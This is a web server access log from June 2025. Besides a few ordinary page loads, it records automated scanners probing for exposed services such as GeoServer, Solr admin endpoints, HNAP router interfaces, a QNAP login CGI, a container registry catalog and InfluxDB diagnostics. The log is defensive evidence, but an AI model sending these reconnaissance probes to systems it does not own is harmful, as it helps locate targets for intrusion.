43.133.91.48 - - [02/Jun/2025:00:11:12 +0000] "GET / HTTP/1.1" 301 169 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.133.91.48 - - [02/Jun/2025:00:11:14 +0000] "GET / HTTP/1.1" 200 2070 "http://ismauaic.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
204.76.203.201 - - [02/Jun/2025:00:15:04 +0000] "GET /geoserver HTTP/1.1" 404 2292 "-" "python-requests/2.25.1"
204.76.203.201 - - [02/Jun/2025:00:15:04 +0000] "GET /geoserver HTTP/1.1" 400 255 "-" "python-requests/2.25.1"
165.232.67.126 - - [02/Jun/2025:00:15:45 +0000] "GET / HTTP/1.0" 200 7880 "-" "-"
165.232.67.126 - - [02/Jun/2025:00:15:45 +0000] "POST /sdk HTTP/1.1" 404 6278 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
165.232.67.126 - - [02/Jun/2025:00:15:45 +0000] "GET /odinhttpcall1748823345 HTTP/1.1" 404 6297 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
165.232.67.126 - - [02/Jun/2025:00:15:45 +0000] "GET /HNAP1 HTTP/1.1" 404 6280 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
165.232.67.126 - - [02/Jun/2025:00:15:45 +0000] "GET /evox/about HTTP/1.1" 404 6289 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
165.232.67.126 - - [02/Jun/2025:00:15:45 +0000] "GET / HTTP/1.0" 200 7880 "-" "-"
165.232.67.126 - - [02/Jun/2025:00:15:46 +0000] "GET / HTTP/1.1" 200 7880 "-" "-"
209.38.243.0 - - [02/Jun/2025:00:15:46 +0000] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 400 255 "-" "Go-http-client/1.1"
164.92.163.72 - - [02/Jun/2025:00:15:46 +0000] "GET /v2/_catalog HTTP/1.1" 400 255 "-" "Go-http-client/1.1"
64.226.77.200 - - [02/Jun/2025:00:15:46 +0000] "GET / HTTP/1.1" 400 255 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
178.128.196.35 - - [02/Jun/2025:00:15:46 +0000] "GET /solr/admin/info/system HTTP/1.1" 400 255 "-" "Go-http-client/1.1"
139.59.144.216 - - [02/Jun/2025:00:15:46 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 400 255 "-" "Go-http-client/1.1"
178.128.196.35 - - [02/Jun/2025:00:15:46 +0000] "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 400 255 "-" "Go-http-client/1.1"
64.227.118.8 - - [02/Jun/2025:00:15:46 +0000] "POST / HTTP/1.1" 405 29 "-" "Go-http-client/1.1"
64.226.77.200 - - [02/Jun/2025:00:15:46 +0000] "GET / HTTP/1.1" 200 2070 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
